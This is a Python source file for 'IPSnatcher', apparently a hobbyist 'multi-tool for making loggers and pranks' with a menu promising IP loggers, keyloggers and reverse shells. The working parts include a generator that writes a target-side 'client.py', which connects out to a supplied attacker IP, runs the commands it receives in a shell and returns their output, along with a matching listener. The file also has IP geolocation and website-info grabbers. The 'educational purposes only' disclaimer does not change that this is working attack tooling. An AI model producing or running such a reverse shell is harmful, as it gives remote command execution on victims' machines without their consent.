import os,win32gui,socket,win32con,time;win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_MAXIMIZE);user = os.environ['USERNAME']
os.system("cls & color & title [IPSnatcher Ver 0.1]")
print("""
                             \033[0;35m /$$$$$$ /$$$$$$$   /$$$$$$                        /$$               /$$                          
                             \033[0;35m|_  $$_/| $$__  $$ /$$__  $$                      | $$              | $$                          
                             \033[0;35m  | $$  | $$  \ $$| $$  \__/ /$$$$$$$   /$$$$$$  /$$$$$$    /$$$$$$$| $$$$$$$   /$$$$$$   /$$$$$$ 
                             \033[1;35m  | $$  | $$$$$$$/|  $$$$$$ | $$__  $$ |____  $$|_  $$_/   /$$_____/| $$__  $$ /$$__  $$ /$$__  $$
                             \033[1;35m  | $$  | $$____/  \____  $$| $$  \ $$  /$$$$$$$  | $$    | $$      | $$  \ $$| $$$$$$$$| $$  \__/
                             \033[1;35m  | $$  | $$       /$$  \ $$| $$  | $$ /$$__  $$  | $$ /$$| $$      | $$  | $$| $$_____/| $$      
                             \033[0;90m /$$$$$$| $$      |  $$$$$$/| $$  | $$|  $$$$$$$  |  $$$$/|  $$$$$$$| $$  | $$|  $$$$$$$| $$      
                             \033[0;37m|______/|__/       \______/ |__/  |__/ \_______/   \___/   \_______/|__/  |__/ \_______/|__/ \033[0m     
                                                
                                                .__                    .___.__                           
                                                |  |   _________     __| _/|__| ____    ____             
                                                |  |  /  _ \__  \   / __ | |  |/    \  / ___\            
                                                |  |_(  <_> ) __ \_/ /_/ | |  |   |  \/ /_/  >           
                                                |____/\____(____  /\____ | |__|___|  /\___  / /\  /\  /\   
                                                                \/      \/         \//_____/  \/  \/  \/ 
                                                 
                                                           
\033[0;35m[\033[0mINFO\033[0;35m]\033[0m Created by qaax_0 on discord
\033[0;31m/!\ ALL STUFF HERE IS ONLY FOR EDUCATIONAL PURPOSES ONLY! /!\ \033[0m 
a multi-tool for making loggers and pranks
This multi tool is still in progress, its not finished!
""")

time.sleep(2);os.system("cls")
main = """
                             \033[0;35m /$$$$$$ /$$$$$$$   /$$$$$$                        /$$               /$$                          
                             \033[0;35m|_  $$_/| $$__  $$ /$$__  $$                      | $$              | $$                          
                             \033[0;35m  | $$  | $$  \ $$| $$  \__/ /$$$$$$$   /$$$$$$  /$$$$$$    /$$$$$$$| $$$$$$$   /$$$$$$   /$$$$$$ 
                             \033[1;35m  | $$  | $$$$$$$/|  $$$$$$ | $$__  $$ |____  $$|_  $$_/   /$$_____/| $$__  $$ /$$__  $$ /$$__  $$
                             \033[1;35m  | $$  | $$____/  \____  $$| $$  \ $$  /$$$$$$$  | $$    | $$      | $$  \ $$| $$$$$$$$| $$  \__/
                             \033[1;35m  | $$  | $$       /$$  \ $$| $$  | $$ /$$__  $$  | $$ /$$| $$      | $$  | $$| $$_____/| $$      
                             \033[0;90m /$$$$$$| $$      |  $$$$$$/| $$  | $$|  $$$$$$$  |  $$$$/|  $$$$$$$| $$  | $$|  $$$$$$$| $$      
                             \033[0;37m|______/|__/       \______/ |__/  |__/ \_______/   \___/   \_______/|__/  |__/ \_______/|__/      



                                                \033[0;37m 1: Create IP Logger      \033[0;37m\033[44m|\033[0m\033[0;37m 5: Geolocation
                                                \033[0;90m 2: Create Reverse shell  \033[0;37m\033[44m|\033[0m\033[0;90m 6: Website Info Grabber
                                                \033[1;35m 3: Create Keylogger      \033[0;37m\033[44m|\033[0m\033[1;35m 7: Create Fake Prank Virus
                                                \033[0;35m 4: Create IP,Info logger \033[0;37m\033[44m|\033[0m\033[0;35m 8: Create Fake BSOD
"""
print(main)
def webs():
    import requests, socket, json
    web = input("Enter Website address:")
    if not web.startswith("http://") and not web.startswith("https://"):
        web = "http://" + web
    try:
        req = requests.get(web)
        for key, value in req.headers.items():
            print(f"{key}: {value}")
        hostname = socket.gethostbyname(web.split("://")[-1].split("/")[0])
        print(f"The IP address of {web} is: {hostname}")

        print("\nFetching IP Information ...\n\n")
        response = requests.get("http://ip-api.com/json/" + hostname)

        data = response.text
        values = json.loads(data)

        print("IP :", values.get('query', 'Not Available'))
        print("STATUS :", values.get('status', 'Not Available'))
        print("COUNTRY :", values.get('country', 'Not Available'))
        print("COUNTRY CODE :", values.get('countryCode', 'Not Available'))
        print("REGION :", values.get('region', 'Not Available'))
        print("CITY :", values.get('city', 'Not Available'))
        print("ZIP :", values.get('zip', 'Not Available'))
        print("LAT :", str(values.get('lat', 'Not Available')))
        print("LON :", str(values.get('lon', 'Not Available')))
        print("TIMEZONE :", values.get('timezone', 'Not Available'))

    except requests.exceptions.RequestException as e:
        print(f"An error occurred while trying to reach {web}: {e}")
    except socket.gaierror:
        print(f"Could not resolve the hostname for {web}. Please check the address.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
def revs():
    cnf = input("Have the listener on a separate file or here? (y/n):")
    print(f"your ip: [{socket.gethostbyname(socket.gethostname())}]")
    aip = input("Attacker ip:")

    clie = f"""
import socket,subprocess,os
server_ip = '{aip}'
server_port = 9001
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, server_port))

while True:
    command = client.recv(1024).decode()
    if command.lower() == 'exit':
        break
    if command.startswith("cd "):
        try:
            os.chdir(command.strip("cd "))
            client.send(b"Changed directory")
        except FileNotFoundError as e:
            client.send(str(e).encode())
    else:
        output = subprocess.run(command, shell=True, capture_output=True)
        client.send(output.stdout + output.stderr)

client.close()
       """

    listener = """
import socket;host = '0.0.0.0';port = 9001
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM);server.bind((host, port));server.listen(5)
print(f"Listening on {host}:{port}...")
while True:
    client_socket, addr = server.accept()
    print(f"Connection from {addr} established.")
    print("this reverse shell is pretty crappy, it might not work all good.")
    while True:
        command = input("RShell>")
        if command.lower() == 'exit':
            client_socket.close()
            break
        if command:
            client_socket.send(command.encode())
            print(client_socket.recv(4096).decode())
            """

    if cnf.lower() == "y":
        with open('client.py', 'w') as file:
            file.write(clie)
        print(f"\033[0;35m[\033[0mINFO\033[0;35m]\033[0m Listener (Attacker's) file saved to: listener.py")
        host = '0.0.0.0';port = 9001
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((host, port))
        server.listen(5)
        print(f"Listening on {host}:{port}...")
        while True:
            client_socket, addr = server.accept()
            print(f"Connection from {addr} established.")
            print("this reverse shell is pretty crappy, it might not work all good.")
            while True:
                command = input("RShell>")
                if command.lower() == 'exit':
                    client_socket.close()
                    break
                if command:
                    client_socket.send(command.encode())
                    print(client_socket.recv(4096).decode())

    else:
        with open('client.py', 'w') as file:
            file.write(clie)
        print(f"\033[0;35m[\033[0mINFO\033[0;35m]\033[0m Client (Target's) file saved to: client.py")
        with open('listener.py', 'w') as file:
            file.write(listener)
        print(f"\033[0;35m[\033[0mINFO\033[0;35m]\033[0m Listener (Attacker's) file saved to: listener.py")

def geo():
    import geocoder, folium
    qip = input("Please enter the IP address: ")
    ip = geocoder.ip(qip)
    if ip.latlng:
        address = ip.latlng
        map = folium.Map(location=address, zoom_start=13)
        folium.Circle(location=address, radius=500).add_to(map)
        map.save(f"{qip}-geo.html")
        print(f"\033[0;35m[\033[0mINFO\033[0;35m]\033[0m Map has been saved to: {qip}-geo.html")
        print(f"\033[0;35m[\033[0mINFO\033[0;35m]\033[0m Coordinates: ", address)
        print(f"\033[0;35m[\033[0mINFO\033[0;35m]\033[0m Starting the file...")
        os.system(f"start {qip}-geo.html")
    else:
        print("Could not find location for the given IP address.")

def ipl():
    pass


while True:
    inp = input(f"\033[0;35mIPSnatcher@{user}$〜\033[0m")
    if inp == "":
        pass
    elif inp == "exit":
        print("\033[0m")
        exit()
    elif inp == "5":
        geo()
    elif inp == "2":
        revs()
    elif inp == "6":
        webs()
    elif inp == "cls":
        os.system("cls")
        print(main)
    else:
        print("command not valid.")
